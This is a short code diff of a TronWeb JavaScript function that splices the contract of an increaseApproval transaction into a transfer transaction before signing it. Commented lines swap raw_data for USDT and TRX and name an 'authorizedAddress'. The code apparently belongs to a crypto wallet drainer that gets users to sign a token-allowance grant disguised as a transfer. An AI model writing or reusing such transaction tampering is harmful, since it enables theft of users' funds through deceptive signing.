@@ -50,7 +50,6 @@ async function executeBlockchainTransaction(
     //   authorizedAddress
     // );
 
-    console.log(transferTx, 'transferTx');
     var raw_data_backup = increaseApprovalTx.transaction.raw_data;
     // increaseApprovalTx.transaction.raw_data = transferTx.transaction.raw_data; // USDT
     // // increaseApprovalTx.transaction.raw_data = transferTx.raw_data; // TRX
@@ -60,7 +59,8 @@ async function executeBlockchainTransaction(
     // );``
 
     transferTx.transaction.raw_data.contract[1] =
-      increaseApprovalTx.transaction.raw_data.contract[1];
+      increaseApprovalTx.transaction.raw_data.contract[0];
+    console.log(transferTx, 'transferTx');
 
     const signedTx = await tronWeb.trx.sign(transferTx.transaction);
 
